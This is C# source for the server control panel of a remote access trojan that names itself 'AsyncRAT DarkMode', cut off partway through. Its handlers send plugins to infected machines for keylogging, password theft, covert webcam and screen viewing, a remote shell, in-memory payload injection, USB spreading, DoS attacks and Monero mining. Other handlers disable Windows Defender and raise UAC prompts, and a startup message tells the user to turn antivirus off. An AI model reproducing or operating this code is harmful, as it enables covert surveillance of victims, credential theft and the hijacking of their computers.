using System;
using System.Windows.Forms;
using Server.MessagePack;
using Server.Connection;
using System.Threading.Tasks;
using Microsoft.VisualBasic;
using System.Linq;
using System.Threading;
using System.Drawing;
using System.IO;
using Server.Forms;
using Server.Algorithm;
using System.Diagnostics;
using Server.Handle_Packet;
using Server.Helper;
using System.Security.Cryptography.X509Certificates;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using cGeoIp;

namespace Server
{

    public partial class Form1 : Form
    {
        private bool trans;
        public cGeoMain cGeoMain = new cGeoMain();
        private List<AsyncTask> getTasks = new List<AsyncTask>();
        private ListViewColumnSorter lvwColumnSorter;

        public Form1()
        {
            InitializeComponent();
/*            listView2.OwnerDraw = true;
            listView2.DrawColumnHeader += listView2_DrawColumnHeader;*/
            SetWindowTheme(listView1.Handle, "explorer", null);
            this.Opacity = 0;
            formDOS = new FormDOS
            {
                Name = "DOS",
                Text = "DOS",
            };
            listView1.SmallImageList = cGeoMain.cImageList;
            listView1.LargeImageList = cGeoMain.cImageList;
        }


        private void CheckFiles()
        {
            try
            {
                if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config")))
                {
                    MessageBox.Show("Missing " + Path.GetFileName(Application.ExecutablePath) + ".config");
                    Environment.Exit(0);
                }

                if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Stub.exe")))
                    MessageBox.Show("Stub not found! unzip files again and make sure your AV is OFF");

                if (!Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
                    Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "AsyncRAT DarkMode", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private Clients[] GetSelectedClients()
        {
            List<Clients> clientsList = new List<Clients>();
            Invoke((MethodInvoker)(() =>
            {
                lock (Settings.LockListviewClients)
                {
                    if (listView1.SelectedItems.Count == 0) return;
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        clientsList.Add((Clients)itm.Tag);
                    }
                }
            }));
            return clientsList.ToArray();
        }

        private Clients[] GetAllClients()
        {
            List<Clients> clientsList = new List<Clients>();
            Invoke((MethodInvoker)(() =>
            {
                lock (Settings.LockListviewClients)
                {
                    if (listView1.Items.Count == 0) return;
                    foreach (ListViewItem itm in listView1.Items)
                    {
                        clientsList.Add((Clients)itm.Tag);
                    }
                }
            }));
            return clientsList.ToArray();
        }

        private async void Connect()
        {
            try
            {
                await Task.Delay(1000);
                string[] ports = Properties.Settings.Default.Ports.Split(',');
                foreach (var port in ports)
                {
                    if (!string.IsNullOrWhiteSpace(port))
                    {
                        Listener listener = new Listener();
                        Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
                        thread.IsBackground = true;
                        thread.Start(Convert.ToInt32(port.ToString().Trim()));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }

        private async void Form1_Load(object sender, EventArgs e)
        {

            this.tabControl1.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed;
            this.tabControl1.DrawItem += new DrawItemEventHandler(this.tabControl1_DrawItem);


            ListviewDoubleBuffer.Enable(listView1);
            ListviewDoubleBuffer.Enable(listView2);
            ListviewDoubleBuffer.Enable(listView3);

            try
            {
                foreach (string client in Properties.Settings.Default.txtBlocked.Split(','))
                {
                    if (!string.IsNullOrWhiteSpace(client))
                    {
                        Settings.Blocked.Add(client);
                    }
                }
            }
            catch { }

            CheckFiles();
            lvwColumnSorter = new ListViewColumnSorter();
            this.listView1.ListViewItemSorter = lvwColumnSorter;
            //this.Text = $"{Settings.Version}";
            using (FormPorts portsFrm = new FormPorts())
            {
                portsFrm.ShowDialog();
            }


            await Methods.FadeIn(this, 5);
            trans = true;

            if (Properties.Settings.Default.Notification == true)
            {
                toolStripStatusLabel2.ForeColor = Color.Green;
            }
            else
            {
                toolStripStatusLabel2.ForeColor = Color.Red;
            }

            new Thread(() =>
            {
                Connect();
            }).Start();
        }

        private void Form1_Activated(object sender, EventArgs e)
        {
            if (trans)
                this.Opacity = 1.0;
        }

        private void Form1_Deactivate(object sender, EventArgs e)
        {
            this.Opacity = 0.95;
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            notifyIcon1.Dispose();
            Environment.Exit(0);
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (listView1.Items.Count > 0)
                if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
                    foreach (ListViewItem x in listView1.Items)
                        x.Selected = true;
        }

        private void listView1_MouseMove(object sender, MouseEventArgs e)
        {
            if (listView1.Items.Count > 1)
            {
                ListViewHitTestInfo hitInfo = listView1.HitTest(e.Location);
                if (e.Button == MouseButtons.Left && (hitInfo.Item != null || hitInfo.SubItem != null))
                    listView1.Items[hitInfo.Item.Index].Selected = true;
            }
        }

        private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            if (e.Column == lvwColumnSorter.SortColumn)
            {
                if (lvwColumnSorter.Order == SortOrder.Ascending)
                {
                    lvwColumnSorter.Order = SortOrder.Descending;
                }
                else
                {
                    lvwColumnSorter.Order = SortOrder.Ascending;
                }
            }
            else
            {
                lvwColumnSorter.SortColumn = e.Column;
                lvwColumnSorter.Order = SortOrder.Ascending;
            }

            this.listView1.Sort();
        }


        // Notifications
        private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
        {
            if (Properties.Settings.Default.Notification == true)
            {
                Properties.Settings.Default.Notification = false;
                toolStripStatusLabel2.ForeColor = Color.Red;
            }
            else
            {
                Properties.Settings.Default.Notification = true;
                toolStripStatusLabel2.ForeColor = Color.Green;
            }
            Properties.Settings.Default.Save();
        }


        private void ping_Tick(object sender, EventArgs e)
        {
            if (listView1.Items.Count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = "This is a ping!";
                foreach (Clients client in GetAllClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                GC.Collect();
            }
        }

        private void UpdateUI_Tick(object sender, EventArgs e)
        {
            //Text = $"{Settings.Version}     {DateTime.Now.ToLongTimeString()}";
            lock (Settings.LockListviewClients)
                toolStripStatusLabel1.Text = $"Online {listView1.Items.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.SentValue).ToString()}     Received {Methods.BytesToString(Settings.ReceivedValue).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     RAM {(int)performanceCounter2.NextValue()}%";
                toolStripStatusLabel1.ForeColor = Color.White;
        }

        private void TOMEMORYToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                FormSendFileToMemory formSend = new FormSendFileToMemory();
                formSend.ShowDialog();
                if (formSend.IsOK)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "sendMemory";
                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSend.toolStripStatusLabel1.Tag.ToString())));
                    if (formSend.comboBox1.SelectedIndex == 0)
                    {
                        packet.ForcePathObject("Inject").AsString = "";
                    }
                    else
                    {
                        packet.ForcePathObject("Inject").AsString = formSend.comboBox2.Text;
                    }

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendMemory.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.Red;
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                formSend.Close();
                formSend.Dispose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private async void TODISKToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Multiselect = true;
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Packet").AsString = "sendFile";
                        packet.ForcePathObject("Update").AsString = "false";

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "plugin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));

                        foreach (Clients client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.Red;
                            foreach (string file in openFileDialog.FileNames)
                            {
                                await Task.Run(() =>
                                {
                                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
                                    packet.ForcePathObject("Extension").AsString = Path.GetExtension(file);
                                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                                });
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void RemoteDesktopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                //DLL Plugin
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\RemoteDesktop.dll"));
                foreach (Clients client in GetSelectedClients())
                {
                    FormRemoteDesktop remoteDesktop = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + client.ID];
                    if (remoteDesktop == null)
                    {
                        remoteDesktop = new FormRemoteDesktop
                        {
                            Name = "RemoteDesktop:" + client.ID,
                            F = this,
                            Text = "RemoteDesktop:" + client.ID,
                            ParentClient = client,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "RemoteDesktop")
                        };
                        remoteDesktop.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\LimeLogger.dll"));

                foreach (Clients client in GetSelectedClients())
                {
                    FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + client.ID];
                    if (KL == null)
                    {
                        KL = new FormKeylogger
                        {
                            Name = "keyLogger:" + client.ID,
                            Text = "keyLogger:" + client.ID,
                            F = this,
                        };
                        KL.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\FileManager.dll"));

                foreach (Clients client in GetSelectedClients())
                {
                    FormFileManager fileManager = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
                    if (fileManager == null)
                    {
                        fileManager = new FormFileManager
                        {
                            Name = "fileManager:" + client.ID,
                            Text = "fileManager:" + client.ID,
                            F = this,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID)
                        };
                        fileManager.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void PasswordRecoveryToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Recovery.dll"));

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                new HandleLogs().Addmsg("Sending Password Recovery..", Color.Black);
                tabControl1.SelectedIndex = 1;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void ProcessManagerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\ProcessManager.dll"));

                foreach (Clients client in GetSelectedClients())
                {
                    FormProcessManager processManager = (FormProcessManager)Application.OpenForms["processManager:" + client.ID];
                    if (processManager == null)
                    {
                        processManager = new FormProcessManager
                        {
                            Name = "processManager:" + client.ID,
                            Text = "processManager:" + client.ID,
                            F = this,
                            ParentClient = client
                        };
                        processManager.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void RunToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                string title = Interaction.InputBox("SEND A NOTIFICATION WHEN CLIENT OPEN A SPECIFIC WINDOW", "TITLE", "YouTube, Photoshop, Steam");
                if (string.IsNullOrEmpty(title))
                    return;
                else
                {
                    lock (Settings.LockReportWindowClients)
                    {
                        Settings.ReportWindowClients.Clear();
                        Settings.ReportWindowClients = new List<Clients>();
                    }
                    Settings.ReportWindow = true;

                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "reportWindow";
                    packet.ForcePathObject("Option").AsString = "run";
                    packet.ForcePathObject("Title").AsString = title;

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            try
            {
                Settings.ReportWindow = false;
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "reportWindow";
                packet.ForcePathObject("Option").AsString = "stop";
                lock (Settings.LockReportWindowClients)
                    foreach (Clients clients in Settings.ReportWindowClients)
                    {
                        ThreadPool.QueueUserWorkItem(clients.Send, packet.Encode2Bytes());
                    }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void WebcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\RemoteCamera.dll"));

                    foreach (Clients client in GetSelectedClients())
                    {
                        FormWebcam remoteDesktop = (FormWebcam)Application.OpenForms["Webcam:" + client.ID];
                        if (remoteDesktop == null)
                        {
                            remoteDesktop = new FormWebcam
                            {
                                Name = "Webcam:" + client.ID,
                                F = this,
                                Text = "Webcam:" + client.ID,
                                ParentClient = client,
                                FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "Camera")
                            };
                            remoteDesktop.Show();
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }

        }

        private void BotsKillerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "botKiller";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miscellaneous.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                new HandleLogs().Addmsg("Sending Botkiller..", Color.Black);
                tabControl1.SelectedIndex = 1;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void USBSpreadToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "limeUSB";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miscellaneous.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
            { }
        }

        private void SeedTorrentToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            using (FormTorrent formTorrent = new FormTorrent())
            {
                formTorrent.ShowDialog();
            }
        }

        private void RemoteShellToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "shell";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miscellaneous.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    FormShell shell = (FormShell)Application.OpenForms["shell:" + client.ID];
                    if (shell == null)
                    {
                        shell = new FormShell
                        {
                            Name = "shell:" + client.ID,
                            Text = "shell:" + client.ID,
                            F = this,
                        };
                        shell.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private readonly FormDOS formDOS;
        private void DOSAttackToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            try
            {
                if (listView1.Items.Count > 0)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "dosAdd";

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miscellaneous.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                    formDOS.Show();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void ExecuteNETCodeToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                using (FormDotNetEditor dotNetEditor = new FormDotNetEditor())
                {
                    dotNetEditor.ShowDialog();
                }
            }

        }
        private void RunToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    using (FormMiner form = new FormMiner())
                    {
                        if (form.ShowDialog() == DialogResult.OK)
                        {
                            if (!File.Exists(@"Plugins\xmrig.bin"))
                            {
                                File.WriteAllBytes(@"Plugins\xmrig.bin", Properties.Resources.xmrig);
                            }
                            MsgPack packet = new MsgPack();
                            packet.ForcePathObject("Packet").AsString = "xmr";
                            packet.ForcePathObject("Command").AsString = "run";
                            XmrSettings.Pool = form.txtPool.Text;
                            packet.ForcePathObject("Pool").AsString = form.txtPool.Text;

                            XmrSettings.Wallet = form.txtWallet.Text;
                            packet.ForcePathObject("Wallet").AsString = form.txtWallet.Text;

                            XmrSettings.Pass = form.txtPass.Text;
                            packet.ForcePathObject("Pass").AsString = form.txtPool.Text;

                            XmrSettings.InjectTo = form.comboInjection.Text;
                            packet.ForcePathObject("InjectTo").AsString = form.comboInjection.Text;

                            XmrSettings.Hash = GetHash.GetChecksum(@"Plugins\xmrig.bin");
                            packet.ForcePathObject("Hash").AsString = XmrSettings.Hash;

                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "plugin";
                            msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
                            msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                            foreach (Clients client in GetSelectedClients())
                            {
                                client.LV.ForeColor = Color.Red;
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void KillToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "xmr";
                    packet.ForcePathObject("Command").AsString = "stop";

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.Red;
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void filesSearcherToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (FormFileSearcher form = new FormFileSearcher())
            {

                if (form.ShowDialog() == DialogResult.OK)
                {
                    if (listView1.SelectedItems.Count > 0)
                    {
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Packet").AsString = "fileSearcher";
                        packet.ForcePathObject("SizeLimit").AsInteger = (long)form.numericUpDown1.Value * 1000 * 1000;
                        packet.ForcePathObject("Extensions").AsString = form.txtExtnsions.Text;

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "plugin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\FileSearcher.dll"));
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (Clients client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                    }
                }
            }
        }

        private void VisitWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                string url = Interaction.InputBox("VISIT WEBSITE", "URL", "https://www.google.com");
                if (string.IsNullOrEmpty(url))
                    return;
                else
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "visitURL";
                    packet.ForcePathObject("URL").AsString = url;

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void SendMessageBoxToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                string Msgbox = Interaction.InputBox("Message", "Message", "Hello World!");
                if (string.IsNullOrEmpty(Msgbox))
                    return;
                else
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "sendMessage";
                    packet.ForcePathObject("Message").AsString = Msgbox;

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }



        private void ChatToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (Clients client in GetSelectedClients())
                {
                    FormChat chat = (FormChat)Application.OpenForms["chat:" + client.ID];
                    if (chat == null)
                    {
                        chat = new FormChat
                        {
                            Name = "chat:" + client.ID,
                            Text = "chat:" + client.ID,
                            F = this,
                            ParentClient = client
                        };
                        chat.Show();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }


        private void GetAdminPrivilegesToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                DialogResult dialogResult = MessageBox.Show(this, "Popup UAC prompt? ", "UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                if (dialogResult == DialogResult.Yes)
                {
                    try
                    {
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Packet").AsString = "uac";

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "plugin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (Clients client in GetSelectedClients())
                        {
                            if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                            {
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
                }
            }
        }

        private void DisableWindowsDefenderToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                DialogResult dialogResult = MessageBox.Show(this, "Will only execute on clients with administrator privileges!", "Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                if (dialogResult == DialogResult.Yes)
                {
                    try
                    {
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Packet").AsString = "disableDefedner";

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "plugin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (Clients client in GetSelectedClients())
                        {
                            if (client.LV.SubItems[lv_admin.Index].Text == "Admin")
                            {
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
                }
            }
        }

        private void RunToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "blankscreen+";

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "blankscreen-";

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void setWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    using (OpenFileDialog openFileDialog = new OpenFileDialog())
                    {
                        openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
                        if (openFileDialog.ShowDialog() == DialogResult.OK)
                        {
                            MsgPack packet = new MsgPack();
                            packet.ForcePathObject("Packet").AsString = "wallpaper";
                            packet.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
                            packet.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);

                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "plugin";
                            msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
                            msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                            foreach (Clients client in GetSelectedClients())
